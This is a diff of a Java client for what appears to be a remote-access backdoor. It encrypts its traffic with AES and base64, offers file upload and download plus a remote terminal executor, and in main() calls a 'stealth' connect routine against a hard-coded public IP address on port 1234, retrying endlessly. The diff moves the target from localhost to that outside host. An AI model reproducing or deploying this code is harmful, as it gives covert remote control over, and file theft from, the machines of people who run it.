@@ -16,7 +16,7 @@ import java.util.Scanner;
 {
 
     private InputStream input;
-     OutputStream output;
+    private OutputStream output;
     private Socket socket;
     private String path=System.getProperty("user.home") + "/Desktop";
     /*
@@ -47,14 +47,13 @@ import java.util.Scanner;
         /*
            Receive a string encrypted with AES and encoded with base64
          */
-        String getRequest() throws Exception
+    String getRequest() throws Exception
     {
-        int count;
-        byte[] bytes = new byte[64*1024];
-        if ((count = input.read(bytes)) > 0) {
-            byte[] received = Arrays.copyOfRange(bytes, 0, count);
+        ObjectInputStream in = new ObjectInputStream(input);
+        byte[] bytes;
+        if ((bytes = (byte[]) in.readObject()) != null) {
             //decrypt the byte array
-            byte[] decrypted = Utilities.decrypt(received);
+            byte[] decrypted = Utilities.decrypt(bytes);
             //decoded with base64
             byte[] valueDecoded = Base64.getDecoder().decode(decrypted);
             //return the string representation
@@ -64,23 +63,23 @@ import java.util.Scanner;
         return "";
     }
 
-        /*
-           Send a string encoded with base64 and encrypted with AES 128 bit
-         */
-        //will change to public access if I had to send messages from the Server class
-        void sendMsg(String msg) throws Exception {
-            //decode the msg into base64
-            byte[] bytesEncoded = Base64.getEncoder().encode(msg.getBytes());
-            //encrypt the byte array
-            byte[] encrypted = Utilities.encrypt(bytesEncoded);
-            //send the encrypted array
-            output.write(encrypted);
+    /*
+      Send a string encoded with base64 and encrypted with AES 128 bit
+    */
+    void sendMsg(String msg) throws Exception {
+        ObjectOutputStream out = new ObjectOutputStream(output);
+        //decode the msg into base64
+        byte[] bytesEncoded = Base64.getEncoder().encode(msg.getBytes());
+        //encrypt the byte array
+        byte[] encrypted = Utilities.encrypt(bytesEncoded);
+        //send the encrypted array
+        out.writeObject(encrypted);
         }
 
         /*
             listen for requests and handle them , "just some test cases here for files transfer"
          */
-        int listen()
+    int listen()
     {
         String request;
         String next;
@@ -167,7 +166,7 @@ import java.util.Scanner;
                             new Executor(new String[]{System.getProperty("os.name"), System.getProperty("user.home")}, this);
                         }catch(Exception e)
                         {
-                            System.out.println("wow");
+                            System.out.println("Terminal error..");
                         }
                         break;
                     default:
@@ -180,7 +179,7 @@ import java.util.Scanner;
             //if Server goes down will try to restart this client if it was running on the Client side
         } catch (Exception e) {
             //close streams if any is still open
-            System.out.println("lsiten E");
+            e.printStackTrace();
             close();
             return -1;
         }
@@ -221,6 +220,7 @@ import java.util.Scanner;
                 try {
                     outO = new ObjectOutputStream(output);
                     outO.writeObject(null);
+                    System.out.println("upload failed");
                 } catch (IOException e1) {
                     e1.printStackTrace();
                 }
@@ -410,8 +410,8 @@ import java.util.Scanner;
     public static void main (String[]args)throws Exception
     {
         int integer;
-        integer = stealth(new String[]{"localhost","1234"});
+        integer = stealth(new String[]{"83.253.236.204","1234"});
         // try connecting again if connection is not closed normally
-        while(integer==-1) integer = stealth(new String[]{"localhost", "1234"});
+        while(integer==-1) integer = stealth(new String[]{"83.253.236.204", "1234"});
     }
     }
